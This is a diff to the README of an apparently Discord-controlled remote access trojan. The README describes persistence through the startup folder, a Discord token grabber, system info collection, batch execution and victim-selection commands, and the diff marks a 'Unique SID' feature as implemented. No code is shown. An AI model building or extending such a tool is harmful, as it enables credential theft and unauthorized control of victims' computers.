@@ -24,6 +24,7 @@ Run it on the victim machine and it will copy itself into startup folder.
 - Get system info
 - Discord token grabber
 - Execute batch scripts *(No Admin)*
+- Unique SID *(Selection ID)*
 
 ## Missing Features
 - Execute batch scripts *(Admin)*
@@ -31,11 +32,10 @@ Run it on the victim machine and it will copy itself into startup folder.
 - Install external software
 - Check tokens validation
 - Control mouse and keyboard
-- Unique SID *(Selection ID)*
 
 ## Commands
 **Without selected victim:** <br>
-`.s UUID` - select the victim by their UUID <br>
+`.s SID` - select the victim by their SID <br>
 `.victims` - show all the available victims <br>
 <br>
 **With selected victim:** <br>
